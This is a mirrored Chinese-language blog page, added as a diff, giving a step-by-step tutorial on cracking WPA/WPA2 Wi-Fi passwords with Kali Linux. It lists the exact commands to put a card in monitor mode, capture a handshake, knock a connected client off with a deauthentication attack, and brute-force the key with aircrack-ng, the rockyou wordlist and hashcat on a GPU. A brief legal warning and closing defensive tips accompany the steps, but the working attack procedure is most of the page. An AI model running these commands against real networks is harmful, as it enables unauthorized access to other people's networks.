@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+  
+<!-- Mirrored from topspeedsnail.com/kali-linux-crack-wifi-wpa/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:54:33 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <title>Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)</title>
+
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Kali Linux能做很多事，但是它主要以渗透测试及’破解wifi密码’闻名。
+
+" />
+    <meta property="og:description" content="Kali Linux能做很多事，但是它主要以渗透测试及’破解wifi密码’闻名。
+
+" />
+    
+    <meta name="author" content="Elephant And Balloon" />
+
+    
+    <meta property="og:title" content="Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)" />
+    <meta property="twitter:title" content="Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="../style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Elephant And Balloon - 关于黑技术的小博客" href="../feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="../index.html" class="site-avatar"><img src="https://avatars1.githubusercontent.com/u/5637917?v=3&amp;s=140" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="../index.html">Elephant And Balloon</a></h1>
+            <p class="site-description">关于黑技术的小博客</p>
+          </div>
+
+          <nav>
+            <a href="../index.html">主页</a>
+            <a href="../about/index.html">关于我</a>
+          </nav>
+
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)</h1>
+
+  <div class="entry">
+    <p>Kali Linux能做很多事，但是它主要以渗透测试及’破解wifi密码’闻名。</p>
+
+<p>如果你使用Macbook，看这里：<a href="../macbook-crack-wifi-with-wpa-wpa2/index.html">使用macbook破解WPA/WPA2 wifi密码</a></p>
+
+<p>要求：</p>
+
+<ul>
+  <li>安装有Kali Linux的计算机</li>
+  <li>支持监控模式的网卡，笔记本电脑一般都支持</li>
+  <li>字典文件</li>
+  <li>时间和耐心</li>
+</ul>
+
+<p>这种攻击需要字典文件，一个好的字典至关重要。我以Kali Linux自带的rockyou字典为例，位于/user/share/wordlists/rockyou.txt.gz。</p>
+
+<p>使用前先解压：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># gzip -d /usr/share/wordlists/rockyou.txt.gz</span></code></pre></figure>
+
+<hr />
+
+<p>注意：破解其他人的wifi密码是“犯罪”，so，don’t；我使用自己的无线路由器演示。</p>
+
+<p>知道了攻击方法，你自然就知道怎么防范了。</p>
+
+<hr />
+
+<h3 id="1首先断开连接的wifi">1）首先断开连接的wifi。</h3>
+
+<p>在终端中执行：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airmon-ng</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2018-15-09.png" alt="破解wifi密码" /></p>
+
+<p>上面命令列出了支持监控模式的无线网卡。如果没有任何输出，表示无线网卡不支持监控模式。你可以看到我的wlan0支持监控模式。</p>
+
+<h3 id="2开启无线网卡的监控模式">2）开启无线网卡的监控模式</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airmon-ng start wlan0</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2018-20-32.png" alt="破解wifi密码" /></p>
+
+<p>执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看。</p>
+
+<h3 id="3查看wifi网络">3）查看wifi网络</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airodump-ng wlan0mon</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2018-29-30.png" alt="破解wifi密码" /></p>
+
+<p>上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID。</p>
+
+<p>按Ctrl-C结束。</p>
+
+<h3 id="4抓取握手包">4）抓取握手包</h3>
+
+<p>使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。</p>
+
+<p>开始抓包：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon</span></code></pre></figure>
+
+<p>参数解释：</p>
+
+<ul>
+  <li>-c指定频道号</li>
+  <li>–bssid指定路由器bssid</li>
+  <li>-w指定抓取的数据包保存位置</li>
+</ul>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2018-40-12.png" alt="破解wifi密码" /></p>
+
+<h3 id="5强制连接到wifi的设备重新连接路由器">5）强制连接到wifi的设备重新连接路由器</h3>
+
+<p>现在我们只要等用户连接/重连接wifi了，运气不好也许要很长时间。</p>
+
+<p>但是我们是不会等的，这不是耐心黑客该干的事。有一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。</p>
+
+<p>aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图(4)可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。</p>
+
+<ul>
+  <li><a href="https://www.aircrack-ng.org/">aircrack-ng官网</a></li>
+</ul>
+
+<p>打开新终端执行：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon</span></code></pre></figure>
+
+<p>参数解释：</p>
+
+<ul>
+  <li>-0表示发起deauthentication攻击</li>
+  <li>-a指定无线路由器BSSID</li>
+  <li>-c指定强制断开的设备</li>
+</ul>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2019-06-35.png" alt="破解wifi密码" /></p>
+
+<p>如果成功：</p>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2019-06-55.png" alt="破解wifi密码" /></p>
+
+<p>按Ctrl-C结束抓包。</p>
+
+<p>我们已经得到了想要的握手包了，可以结束无线网卡的监控模式了：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># airmon-ng stop wlan0mon</span></code></pre></figure>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2019-09-20.png" alt="破解wifi密码" /></p>
+
+<h3 id="6-开始破解密码">6) 开始破解密码</h3>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap</span></code></pre></figure>
+
+<p>参数解释：</p>
+
+<ul>
+  <li>-a2代表WPA的握手包</li>
+  <li>-b指定要破解的wifi BSSID。</li>
+  <li>-w指定字典文件</li>
+  <li>最后是抓取的包</li>
+</ul>
+
+<p><img src="../images/2016/4/Screenshot%20from%202016-04-21%2020-06-53.png" alt="破解wifi密码" /></p>
+
+<h3 id="可选使用显卡的运算能力">可选）使用显卡的运算能力</h3>
+
+<p>如果你有一个强大的GPU，为什么不使用GPU跑字典呢？</p>
+
+<p><a href="http://hashcat.net/">Hashcat</a>可以借助GPU的运算力破解各种不同算法的hash值。</p>
+
+<p>下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。</p>
+
+<p>在破解cap文件之前，要把它转换为hccap文件：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># aircrack-ng file.cap -J out.hccap</span></code></pre></figure>
+
+<p>使用GPU破解hash：</p>
+
+<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># hashcat -m 2500 out.hccap 字典文件</span></code></pre></figure>
+
+<hr />
+
+<p>总结：防止这种攻击最简单的方法是设置贼复杂贼长的密码；</p>
+
+<p>不要使用WEP加密方式，非常容易被破解：</p>
+
+<ul>
+  <li><a href="../kali-linux-crack-wifi-password-wep/index.html">Kali Linux破解wifi密码(WEP)</a></li>
+</ul>
+
+<p>现在的无线路由器都有WPS功能，关了吧：</p>
+
+<ul>
+  <li><a href="../kali-linux-crack-wifi-password-wps/index.html">使用Reaver破解开启了WPS功能的wifi密码(wpa/wpa2)</a></li>
+</ul>
+
+  </div>
+
+  <div class="date">
+    Written on April 21, 2016
+  </div>
+
+  
+<div class="comments">
+	<div id="disqus_thread"></div>
+	<script type="text/javascript">
+
+	    var disqus_shortname = 'elephantandballoon';
+
+	    (function() {
+	        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+	        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+	        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+	    })();
+
+	</script>
+	<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/tiancode"><i class="svg-icon github"></i></a>
+
+
+
+
+
+
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+	<!-- Google Analytics -->
+	<script>
+		(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+		(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+		m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+		})(window,document,'script','http://www.google-analytics.com/analytics.js','ga');
+
+		ga('create', 'UA-75657205-1', 'auto');
+		ga('send', 'pageview', {
+		  'page': '/kali-linux-crack-wifi-wpa/',
+		  'title': 'Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)'
+		});
+	</script>
+	<!-- End Google Analytics -->
+
+
+  </body>
+
+<!-- Mirrored from topspeedsnail.com/kali-linux-crack-wifi-wpa/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 30 Nov 2017 03:56:03 GMT -->
+</html>
